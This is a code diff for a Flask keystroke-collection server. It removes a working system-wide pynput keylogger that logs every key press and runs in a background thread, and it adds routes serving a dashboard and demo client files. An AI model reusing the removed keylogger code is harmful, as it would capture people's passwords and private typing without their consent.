@@ -1,7 +1,5 @@
-from flask import Flask, request
+from flask import Flask, request, send_file
 from flask_cors import CORS
-from pynput import keyboard
-import threading
 import os
 import socket
 import platform
@@ -18,32 +16,6 @@ def write_to_log(data):
 
 CONNECTED_DEVICES = {}
 RECENT_KEYSTROKES = []
-
-# SYSTEM KEYLOGGER (PYNPUT)
-def on_press(key):
-    try:
-        k = key.char
-    except AttributeError:
-        if key == keyboard.Key.space: k = " "
-        elif key == keyboard.Key.enter: k = "\n"
-        elif key == keyboard.Key.backspace: k = "[DEL]"
-        else: k = f" [{key.name.upper()}] "
-
-    print(f"[SYSTEM KEYBOARD] : {k}")
-    write_to_log(k)
-    
-    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
-    RECENT_KEYSTROKES.append({
-        "type": "SYSTEM KEYBOARD",
-        "key": k,
-        "time": timestamp
-    })
-    if len(RECENT_KEYSTROKES) > 50:
-        RECENT_KEYSTROKES.pop(0)
-
-def run_pynput_listener():
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
 
 def get_server_metadata():
     original_device_name = socket.gethostname()
@@ -68,6 +40,27 @@ def parse_browser_name(user_agent):
     elif "Safari" in user_agent:
         return "Safari"
     return "Web Browser"
+
+@app.route('/', methods=['GET'])
+@app.route('/dashboard', methods=['GET'])
+def index():
+    return send_file(os.path.join(os.path.dirname(__file__), 'server_details.html'))
+
+@app.route('/demo', methods=['GET'])
+@app.route('/client', methods=['GET'])
+def client_demo():
+    client_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'clients')
+    return send_file(os.path.join(client_dir, 'index.html'))
+
+@app.route('/main.css', methods=['GET'])
+def client_css():
+    client_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'clients')
+    return send_file(os.path.join(client_dir, 'main.css'))
+
+@app.route('/script.js', methods=['GET'])
+def client_js():
+    client_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'clients')
+    return send_file(os.path.join(client_dir, 'script.js'))
 
 @app.route('/log', methods=['POST', 'OPTIONS'])
 def log_web():
@@ -174,9 +167,6 @@ def print_server_display():
     print("=" * 60 + "\n")
 
 if __name__ == "__main__":
-    system_logger = threading.Thread(target=run_pynput_listener, daemon=True)
-    system_logger.start()
-
     print_server_display()
 
    
